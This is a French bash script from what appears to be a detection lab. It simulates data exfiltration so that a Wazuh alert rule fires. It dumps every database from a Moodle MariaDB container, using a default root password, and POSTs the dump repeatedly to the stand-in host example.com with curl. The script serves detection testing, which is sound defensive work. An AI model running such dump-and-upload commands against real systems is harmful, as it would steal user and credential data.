#!/usr/bin/env bash
# ============================================================
#  04-massive-export.sh
#  Rejoue le scénario D4 : exfiltration via export volumineux.
#  À exécuter depuis un compte compromis sur la VM apps.
#  Doit déclencher la règle Wazuh ID 100230.
# ============================================================
set -euo pipefail

# Sur kali, on simule une exfiltration en exécutant un dump à distance
TARGET_HOST="${TARGET_HOST:-10.10.10.10}"
TARGET_PORT="${TARGET_PORT:-3306}"
DB_USER="${DB_USER:-moodle}"
DB_NAME="${DB_NAME:-moodle}"

echo "==> [D4] Simulation d'exfiltration depuis ${TARGET_HOST}"
echo "    Cette attaque DOIT déclencher la règle Wazuh ID 100230 (level 12)."
echo

# Si exécuté sur la VM apps directement (compte debian)
if [ -S /var/run/docker.sock ]; then
  echo "==> Phase 1 : dump complet via docker exec"
  docker exec moodle-db mariadb-dump -u root -p"${MOODLE_DB_ROOT_PASSWORD:-changeme-moodle-root}" \
    --all-databases > /tmp/exfil_dump.sql 2>&1 || echo "    (échec attendu si pas le mdp, le but est le pic réseau)"

  echo "==> Phase 2 : exfiltration vers Internet (curl factice)"
  for i in {1..10}; do
    curl -k -X POST -d @/tmp/exfil_dump.sql "https://example.com/upload" >/dev/null 2>&1 || true
    echo "    Upload chunk ${i}/10..."
  done
else
  echo "==> Pas sur la VM apps. Génération d'un trafic sortant volumineux à la place..."
  for i in {1..50}; do
    head -c 1M /dev/urandom | base64 | curl -k -X POST -d @- https://example.com/ >/dev/null 2>&1 || true
  done
fi

echo
echo "==> Vérifier dans Wazuh : rule.groups : tutotech,d4,attack"
